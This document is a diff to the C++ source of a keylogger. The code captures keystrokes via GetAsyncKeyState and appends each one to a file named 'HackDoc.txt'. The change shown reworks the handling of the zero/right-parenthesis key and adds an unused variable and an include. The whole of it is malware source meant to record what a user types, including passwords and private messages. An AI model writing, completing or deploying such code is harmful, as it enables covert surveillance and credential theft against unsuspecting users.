@@ -3,12 +3,14 @@
 #include <fstream>
 #include <stdio.h>
 #include <string>
+#include <time.h>
 
 
 void WriteToFile(LPCSTR text)
 {
 	std::ofstream doc_to;
 	doc_to.open("HackDoc.txt", std::fstream::app);
+	std::string _chars;
 	doc_to << text;
 	doc_to.close();
 }
@@ -27,12 +29,18 @@ bool Key_is_Listed(WORD iKey)
 		WriteToFile(" *F1* ");
 		break;
 
-	case '!':
+	case 48:
 		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 		{
-		    std::cout << "!";
-			WriteToFile("!");
+			std::cout << ")";
+			WriteToFile(")");
 		}
+		else
+		{
+			std::cout << "0";
+			WriteToFile("0");
+		}
+		break;
 
 	case VK_RETURN:
 		std::cout << "\n";
@@ -94,6 +102,8 @@ bool Key_is_Listed(WORD iKey)
 		std::cout << " Delete ";
 		WriteToFile(" Delete ");
 		break;
+
+		
 
 	case 'A':
 		std::cout << " A ";
